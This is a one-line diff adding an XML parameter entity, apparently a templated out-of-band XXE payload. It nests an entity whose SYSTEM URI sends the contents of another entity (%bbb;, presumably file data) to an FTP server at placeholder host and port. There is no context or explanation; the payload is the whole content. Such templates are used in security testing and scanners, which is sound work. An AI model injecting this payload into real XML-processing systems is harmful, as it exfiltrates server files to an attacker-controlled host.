@@ -1,0 +1,1 @@
+<!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:@%HOSTNAME%:%FTP_PORT%/%bbb;'>">
